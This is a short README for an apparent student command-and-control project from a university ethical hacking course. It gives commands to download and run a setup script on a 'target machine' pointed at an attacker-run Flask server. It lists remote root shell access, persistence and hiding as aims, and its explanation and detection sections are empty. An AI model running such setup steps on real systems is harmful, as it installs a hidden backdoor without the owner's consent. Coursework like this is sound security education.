# Command-Control

## CS378 Ethical Hacking - Command and Control

David Trakhtengerts : dst726 and Ricky Woodruff : rgw664

## Install

### Target Machine

```bash
curl -L http://github.com/woodruffr4/Command-Control/archive/main.tar.gz | tar zxf -
cd Command-Control-main
chmod +x setup.sh
./setup.sh {Your Server Endpoint} # Example: ./setup.sh http://10.0.2.4:5000/commands
```

### Attack Machine

-   Install `flask`
-   Run the flask server

```python
export FLASK_APP=attacker-server.py
flask run --host={Server IP}
```

## How it works

## How it meets the requirements

1. Provide remote root shell access
2. Persistence
3. Configuration
4. Authentication
5. Hiding

## Detection
